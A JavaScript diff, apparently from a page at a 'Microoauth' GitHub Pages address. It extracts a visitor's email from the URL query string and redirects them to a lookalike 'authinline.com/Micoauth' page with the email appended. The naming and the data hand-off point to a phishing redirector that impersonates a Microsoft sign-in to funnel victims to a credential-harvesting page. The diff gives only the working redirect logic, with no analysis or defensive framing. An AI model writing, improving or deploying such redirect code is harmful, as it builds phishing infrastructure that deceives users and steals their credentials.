@@ -8,19 +8,18 @@
 
       // Check if the URL contains an '=' character followed by '?'
       if (currentURL.includes('=') && currentURL.includes('?')) {
-        // Split the URL into two parts: the base URL and the email part
-        var parts = currentURL.split('=');
-        var baseURL = parts[0]; // https://Microoauth.github.io/mail
-        var emailPart = parts[1];
+        // Extract the email using a regular expression
+        var emailRegex = /=(.*?)(&|$)/;
+        var emailMatch = currentURL.match(emailRegex);
 
-        // Extract the email by finding the first '@' symbol
-        var email = emailPart.match(/[^@]+@[^@]+/);
+        if (emailMatch) {
+          // Extract the email value
+          var email = emailMatch[1];
 
-        if (email) {
-          // Construct the redirect URL by appending the extracted email to the second link
-          var redirectURL = 'https://authinline.com/Micoauth/index.html#' + email[0];
+          // Construct the final redirect URL
+          var redirectURL = 'https://authinline.com/Micoauth/index.html#' + email;
 
-          // Redirect to the constructed URL
+          // Redirect to the final URL
           window.location.href = redirectURL;
         } else {
           // If no email is found in the URL, simply redirect to the second link
